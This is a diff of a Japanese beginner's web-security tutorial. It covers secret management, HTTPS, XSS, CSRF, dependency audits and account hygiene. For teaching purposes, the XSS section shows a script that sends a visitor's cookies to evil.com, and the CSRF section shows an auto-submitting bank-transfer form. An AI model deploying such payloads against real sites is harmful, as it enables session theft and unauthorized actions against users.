+<p>GitHub はコードを検索できます。<code>sk-</code> で始まる文字列を検索しているボットが常に存在し、プッシュから数分以内に不正利用が始まった事例があります。</p>
+<h3 id="_8">✅ 正しい管理方法<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># .env ファイル（絶対に Git に含めない）</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nv">OPENAI_API_KEY</span><span class="o">=</span>sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nv">DATABASE_URL</span><span class="o">=</span>postgresql://user:password@db.example.com/prod
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># .gitignore に追加（これを忘れると .env が公開される）</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>.env
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>.env.local
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>.env.production
+</span></code></pre></div>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># コードでは環境変数名だけ参照する</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">api_key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;OPENAI_API_KEY&quot;</span><span class="p">)</span>  <span class="c1"># 値はコードに書かない</span>
+</span></code></pre></div>
+<h3 id="_9">やってしまったときの対処<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>.env を push してしまった場合:
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>  1. 即座にそのAPIキー・パスワードを無効化・再発行する
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>  2. git の履歴から削除する（削除してもキャッシュされている可能性あり）
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>  → 「削除したから大丈夫」は間違い。必ずキーを再発行すること。
+</span></code></pre></div>
+<h3 id="cicd">CI/CD での秘密情報の渡し方<a class="headerlink" href="#cicd" title="Permanent link">&para;</a></h3>
+<p>GitHub Actions や Cloudflare Pages にキーを渡すには、サービスの「Secrets」機能を使います。</p>
+<div class="language-yaml highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># GitHub Actions での例</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nt">jobs</span><span class="p">:</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">  </span><span class="nt">deploy</span><span class="p">:</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">    </span><span class="nt">steps</span><span class="p">:</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Deploy</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w">        </span><span class="nt">env</span><span class="p">:</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">          </span><span class="nt">API_KEY</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ secrets.OPENAI_API_KEY }}</span><span class="w">  </span><span class="c1"># GitHub の Secrets から参照</span>
+</span></code></pre></div>
+<hr />
+<h2 id="https">HTTPS（通信の暗号化）<a class="headerlink" href="#https" title="Permanent link">&para;</a></h2>
+<h3 id="http-vs-https">HTTP vs HTTPS<a class="headerlink" href="#http-vs-https" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>HTTP（暗号化なし）:
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>  あなた ──── &quot;パスワード: abc123&quot; ────→ サーバー
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>                       ↑
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>                  途中で盗み見られる
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>HTTPS（暗号化あり）:
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>  あなた ──── &quot;x7$Kp#mQ...&quot; ────→ サーバー
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>  （TLS で暗号化されているので盗み見ても意味がない）
+</span></code></pre></div>
+<p><strong>Cloudflare Pages・GitHub Pages に deploy すれば HTTPS は自動で有効</strong>になります。ブラウザのアドレスバーに 🔒 が表示されていれば OK です。</p>
 <blockquote>
-<p><strong>エスケープとは：</strong> <code>&lt;script&gt;</code> のような HTML の特殊文字を <code>&amp;lt;script&amp;gt;</code> のような無害な文字列に変換することです。エスケープされた文字はブラウザが「コード」ではなく「テキスト」として表示するため、JavaScript として実行されません。</p>
+<p>HTTPS の仕組み（TLS・公開鍵暗号・ハイブリッド暗号）は <a href="../暗号技術/">暗号技術</a> で詳しく解説しています。</p>
 </blockquote>
-<h3 id="csrf">CSRF（クロスサイトリクエストフォージェリ）<a class="headerlink" href="#csrf" title="Permanent link">&para;</a></h3>
-<p>ユーザーが意図しない操作をさせる攻撃です。フォームを持つサイトで問題になります。静的サイトであれば基本的に心配不要です。</p>
-<h3 id="_6">依存パッケージの脆弱性<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
-<p>使用しているパッケージに既知の脆弱性がある場合があります。</p>
-<p>依存パッケージは便利ですが、そこに脆弱性が見つかることもあります。<code>npm audit</code> は、現在の依存関係に既知の脆弱性がないかを確認するコマンドです。</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># 脆弱性を確認します</span>
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>npm<span class="w"> </span>audit
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1"># 自動修正を試みます</span>
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>npm<span class="w"> </span>audit<span class="w"> </span>fix
+<hr />
+<h2 id="xss">XSS（クロスサイトスクリプティング）<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h2>
+<h3 id="_10">何をされる攻撃か<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
+<p><strong>攻撃者がサイトに悪意ある JavaScript を埋め込み、他のユーザーのブラウザで実行させます。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>シナリオ: コメント欄のある掲示板
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>1. 攻撃者がコメントに「&lt;script&gt;悪いコード&lt;/script&gt;」を投稿
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>2. 他のユーザーがそのページを開く
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>3. ブラウザが「コメント内のテキスト」ではなく
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>   「プログラム」として実行してしまう
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>4. ユーザーのクッキー（ログイン情報）が攻撃者のサーバーに送られる
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>5. 攻撃者がそのクッキーを使ってそのユーザーとしてログインできる
 </span></code></pre></div>
-<p><code>npm audit fix</code> は、互換性を保てる範囲で安全なバージョンへ更新を試みます。実行後は、サイトが壊れていないかビルドや動作確認を行います。</p>
-<h3 id="npm-audit">npm audit の出力を読む<a class="headerlink" href="#npm-audit" title="Permanent link">&para;</a></h3>
-<p>監査結果には、脆弱性の件数と深刻度が表示されます。深刻度によって対応の優先順位を決めます。</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>found 5 vulnerabilities (1 low, 2 moderate, 2 critical)
+<div class="language-html highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="cm">&lt;!-- 攻撃者が投稿するコメント --&gt;</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">  </span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;https://evil.com/steal?c=&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<h3 id="_11">なぜ起きるか・どう防ぐか<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># ❌ 危険：ユーザー入力をそのままHTMLに出力</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">)</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;&lt;p&gt;こんにちは、</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">さん&lt;/p&gt;&quot;</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c1"># name に &lt;script&gt;... を入れられると実行される</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="c1"># ✅ 安全：エスケープ処理を通す</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="kn">from</span><span class="w"> </span><span class="nn">markupsafe</span><span class="w"> </span><span class="kn">import</span> <span class="n">escape</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;&lt;p&gt;こんにちは、</span><span class="si">{</span><span class="n">escape</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="si">}</span><span class="s2">さん&lt;/p&gt;&quot;</span>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="c1"># &lt;script&gt; → &amp;lt;script&amp;gt; に変換され、テキストとして表示される</span>
+</span></code></pre></div>
+<p><strong>React・Vue・Jinja2 などのモダンなフレームワークはデフォルトでエスケープします。</strong><br />
+<code>dangerouslySetInnerHTML</code>（React）や <code>| safe</code>（Jinja2）など、エスケープを意図的に無効化する機能を使うときだけ注意が必要です。</p>
+<hr />
+<h2 id="csrf">CSRF（クロスサイトリクエストフォージェリ）<a class="headerlink" href="#csrf" title="Permanent link">&para;</a></h2>
+<h3 id="_12">何をされる攻撃か<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<p><strong>別のサイトから、ユーザーが意図しないリクエストを「ユーザー本人として」送らせます。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>シナリオ: ネットバンキング
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>1. あなたが銀行サイトにログイン中（ブラウザにクッキーが保存されている）
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>2. 攻撃者が罠ページに以下を仕込む:
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>   &lt;form action=&quot;https://bank.example.com/transfer&quot; method=&quot;POST&quot;&gt;
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>     &lt;input name=&quot;to&quot;     value=&quot;攻撃者の口座番号&quot;&gt;
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>     &lt;input name=&quot;amount&quot; value=&quot;100000&quot;&gt;
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>   &lt;/form&gt;
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>   &lt;script&gt;document.forms[0].submit()&lt;/script&gt;
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>3. あなたが罠ページを開いただけで、フォームが自動送信
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>4. ブラウザは「銀行サイトへのリクエスト」に自動でクッキーを付ける
+</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>5. 銀行サーバーから見ると「あなた本人からの振込リクエスト」に見える
+</span></code></pre></div>
+<p>XSS は「クッキーを盗む」攻撃、CSRF は「クッキーを使ってリクエストを送らせる」攻撃です。どちらもクッキーが関係しますが、悪用の仕方が違います。</p>
+<h3 id="_13">防御策<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># FastAPI + CSRF トークンの例</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="c1"># サーバーがランダムなトークンをフォームに埋め込む</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="c1"># 攻撃者は別サイトからそのトークンを読めない → 正しいトークンがない → 弾く</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="c1"># 最も簡単な対策: SameSite Cookie</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="c1"># response.set_cookie(&quot;session&quot;, value, samesite=&quot;Strict&quot;)</span>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="c1"># → 別サイトからのリクエストにはクッキーを送らない</span>
+</span></code></pre></div>
+<p><strong>静的サイト（フォームのないサイト）は CSRF の心配はほぼ不要です。</strong></p>
+<hr />
+<h2 id="_14">依存パッケージの脆弱性<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h2>
+<p>ライブラリにも脆弱性が見つかります。古いバージョンを使い続けると、公開された脆弱性を突かれます。</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># JavaScript: 脆弱性チェック</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>npm<span class="w"> </span>audit
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="c1"># Python</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>pip<span class="w"> </span>install<span class="w"> </span>pip-audit
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>pip-audit
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="c1"># 結果の見方</span>
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>found<span class="w"> </span><span class="m">3</span><span class="w"> </span>vulnerabilities<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>critical,<span class="w"> </span><span class="m">2</span><span class="w"> </span>moderate<span class="o">)</span>
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>│<span class="w"> </span>critical<span class="w"> </span>│<span class="w"> </span>prototype-pollution<span class="w"> </span><span class="k">in</span><span class="w"> </span>lodash<span class="w"> </span>&lt;<span class="w"> </span><span class="m">4</span>.17.21<span class="w"> </span>│
 </span></code></pre></div>
 <table>
 <thead>
 <tr>
 <th>深刻度</th>
-<th>意味</th>
 <th>対応方針</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td><strong>critical</strong></td>
-<td>即座に対応が必要</td>
-<td>直ちに <code>npm audit fix</code> を実行します</td>
+<td>即対応（今日中）</td>
 </tr>
 <tr>
 <td><strong>high</strong></td>
-<td>できるだけ早く対応</td>
-<td>今週中に対応します</td>
+<td>今週中</td>
 </tr>
 <tr>
-<td><strong>moderate</strong></td>
-<td>影響は限定的</td>
-<td>次のリリースまでに対応します</td>
+<td>moderate</td>
+<td>次のリリースまでに</td>
 </tr>
 <tr>
-<td><strong>low</strong></td>
-<td>ほぼ影響なし</td>
-<td>余裕があれば対応します</td>
+<td>low</td>
+<td>余裕があれば</td>
 </tr>
 </tbody>
 </table>
-<p>詳細を見るには：</p>
-<p>すべての低リスク警告まで見ると情報量が多すぎる場合があります。一定以上の深刻度だけを表示して、優先度の高い問題から確認できます。</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>npm<span class="w"> </span>audit<span class="w"> </span>--audit-level<span class="o">=</span>moderate<span class="w">   </span><span class="c1"># moderate 以上だけ表示します</span>
-</span></code></pre></div>
-<h3 id="dependabotgithub">Dependabot（GitHub の自動脆弱性検出）<a class="headerlink" href="#dependabotgithub" title="Permanent link">&para;</a></h3>
-<p>GitHub は自動的にリポジトリの依存パッケージを監視し、脆弱性を発見すると <strong>Dependabot</strong> が自動で PR を作成してくれます。</p>
-<p><strong>通知が来たら：</strong>
-1. PR の内容を確認します（どのパッケージの何が問題か）
-2. <code>npm audit fix</code> でローカルも更新します
-3. テスト・確認後にマージします</p>
 <hr />
-<h2 id="_7">アクセス権限の管理<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
-<h3 id="github">GitHub の権限設定<a class="headerlink" href="#github" title="Permanent link">&para;</a></h3>
-<table>
-<thead>
-<tr>
-<th>ロール</th>
-<th>できること</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>Owner</strong></td>
-<td>すべての操作。リポジトリ削除も可能</td>
-</tr>
-<tr>
-<td><strong>Admin</strong></td>
-<td>設定変更・メンバー管理</td>
-</tr>
-<tr>
-<td><strong>Write</strong></td>
-<td>コードの push・マージ</td>
-</tr>
-<tr>
-<td><strong>Read</strong></td>
-<td>コードの閲覧のみ</td>
-</tr>
-</tbody>
-</table>
-<p><strong>最小権限の原則</strong> ：必要最小限の権限だけを付与します。関係のない人に Admin 権限を与えないようにしましょう。</p>
-<h3 id="_8">不要になったアクセスの削除<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
-<p>メンバーが抜けた場合は、速やかにリポジトリとその他サービスへのアクセスを削除します。</p>
+<h2 id="_15">アカウント・権限の管理<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h2>
+<h3 id="_16">パスワード管理<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
 <ul>
-<li>GitHub: Settings → Collaborators → Remove</li>
-<li>Cloudflare: アカウントメンバーから削除</li>
+<li><strong>12文字以上</strong>・英大小文字・数字・記号を含む</li>
+<li><strong>サービスごとに違うパスワード</strong>（1つ漏れても他が安全）</li>
+<li><strong>パスワードマネージャーを使う</strong>（Bitwarden・1Password など。無料で使える）</li>
 </ul>
-<hr />
-<h2 id="_9">パスワード・アカウント管理<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
-<h3 id="_10">強力なパスワードを使う<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
-<ul>
-<li>12 文字以上</li>
-<li>英大文字・小文字・数字・記号を含む</li>
-<li>サービスごとに異なるパスワードを使う</li>
-</ul>
-<p><strong>パスワードマネージャーの使用を強く推奨します</strong> （1Password, Bitwarden など）。</p>
 <h3 id="2fa">二要素認証（2FA）を有効にする<a class="headerlink" href="#2fa" title="Permanent link">&para;</a></h3>
-<p>GitHub, Cloudflare などの重要なサービスでは必ず二要素認証を設定します。</p>
-<p><strong>GitHub での設定：</strong>
-Settings → Password and authentication → Two-factor authentication</p>
+<p>パスワードが漏れても、もう1つの認証（スマホのワンタイムパスワードなど）がないとログインできません。</p>
+<p>GitHub・Google・GitHub 等の重要サービスでは必ず有効にしてください。</p>
+<h3 id="_17">最小権限の原則<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
+<p>必要な権限だけを付与します。「とりあえず全部」は事故の温床です。</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>GitHub リポジトリのロール:
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>  Owner  → リポジトリの削除もできる（本当に必要な人だけ）
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>  Admin  → 設定変更・メンバー管理
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>  Write  → コードのプッシュ・マージ
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>  Read   → 閲覧のみ（外部レビュアーはここで十分）
+</span></code></pre></div>
 <hr />
-<h2 id="_11">セキュリティチェックリスト<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h2>
-<p>プロジェクトを公開する前に確認しましょう。</p>
-<p>チェックリストは、セキュリティ対策を「知っている」だけで終わらせず、公開前に実際に確認するためのものです。</p>
-<ul>
-<li>[ ] サイトが HTTPS で提供されている（Cloudflare の 🔒 マーク確認）</li>
-<li>[ ] <code>.env</code> ファイルが <code>.gitignore</code> に追加されている</li>
-<li>[ ] API キーなどの秘密情報がコードに直接書かれていない</li>
-<li>[ ] GitHub リポジトリのアクセス権限が適切に設定されている</li>
-<li>[ ] <code>npm audit</code> でパッケージの脆弱性がないか確認した</li>
-<li>[ ] メンバー全員が二要素認証を設定している</li>
-</ul>
+<h2 id="_18">セキュリティチェックリスト<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h2>
+<p>公開前に必ず確認してください。</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>【秘密情報】
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>□ .env が .gitignore に追加されている
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>□ API キー・パスワードがコードに直接書かれていない
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>□ git log を見て .env がコミット履歴に入っていない
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>【通信】
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>□ HTTPS が有効（ブラウザの 🔒 マーク確認）
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>□ HTTP → HTTPS のリダイレクトが設定されている
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>【アカウント】
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>□ 重要なサービスの 2FA を有効にしている
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>□ チームメンバーの権限が適切（最小権限）
+</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>□ 退出したメンバーのアクセスを削除した
+</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>
+</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>【パッケージ】
+</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>□ npm audit / pip-audit を実行した
+</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>□ critical・high の脆弱性がない
+</span></code></pre></div>
 <hr />
-<h2 id="_12">よくある疑問<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h2>
-<p><strong>Q. 静的サイトでもセキュリティは必要？</strong><br />
-A. はい。サーバーサイドの攻撃リスクは少ないですが、依存パッケージの脆弱性、秘密情報の漏洩、権限管理の問題は静的サイトでも起きます。</p>
-<p><strong>Q. GitHub のリポジトリを Public にしていいの？</strong><br />
-A. コード自体は問題ありませんが、<code>.env</code> ファイルや API キーが含まれていないことを必ず確認してください。</p>
-<p><strong>Q. <code>npm audit</code> で脆弱性が出たけど修正できない</strong><br />
-A. <code>npm audit fix --force</code> で強制修正できますが、依存関係が壊れることがあります。まず <code>npm audit fix</code> を試し、解決しない場合はチームメンバーに相談しましょう。</p>
-<hr />
